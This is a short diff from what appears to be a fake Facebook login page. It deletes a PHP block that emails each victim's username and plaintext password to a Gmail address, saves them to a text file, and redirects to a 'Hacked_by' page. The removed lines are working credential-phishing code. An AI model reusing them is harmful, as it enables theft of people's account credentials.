@@ -47,18 +47,7 @@
                  <li><i class="fa fa-twitter" aria-hidden="true"></i></li>
                  {
                     
-             $_SESSION["Username"] = $username;
-             echo $_SESSION["Username"];
-    		 $subject = "Mã nguồn: Sơn Lý Hồng Đức:\nLưu ý: Thông tin này là bảo mật, tuyệt đối không tiết lộ cho bất kì ai\nTài khoảng đã đăng nhập:";
-             $headers = "Đăng nhập Facebook";
-             $comment = "";
-             $body = "----------------------------------------------\nTài khoản: $username\nMật khẩu: $password \n----------------------------------------------\n";
-             mail("sonlyhongduc@gmail.com", $headers, $body, $subject);
-            $test = fopen("Tài khoảng.txt","a");
-            fwrite($test,$body);
-            fclose($test); 
-            header('Location:https://duccodedao.github.io/Hacked_by_BmassHD/');
-          }
+          
              </ul>
          </div>
      </div>
